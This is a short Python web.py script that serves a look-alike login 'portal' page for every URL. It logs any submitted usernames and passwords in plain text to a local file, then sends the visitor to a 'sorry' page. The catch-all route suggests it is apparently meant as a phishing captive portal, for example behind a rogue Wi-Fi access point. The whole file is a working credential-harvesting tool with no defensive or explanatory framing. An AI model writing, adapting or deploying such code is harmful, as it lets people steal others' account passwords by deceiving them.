# -*- coding: utf-8 -*
import sys
reload(sys)
sys.setdefaultencoding("utf-8")

import web
f = open("/Users/FANGs/Desktop/Portal.html")
r = f.read()
f.close()

class index(object):
    def GET(self):
        if web.input().has_key('username'):
            word = web.input()['username']
            print word
        if web.input().has_key('password'):
            word = web.input()['password']
            print word
        return r
class infor(object):
    def POST(self):
        i = web.input()['username']
        p = web.input()['password']
        print i,p
        w = open("/Users/FANGs/Desktop/password","a")
        data = "username:"+i+" password:"+p+"\n"
        w.write(data)
        w.close()
        web.seeother('/static/sorry.html')
urls = (
    '/infor','infor',
    '/.*', 'index'
)

if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()
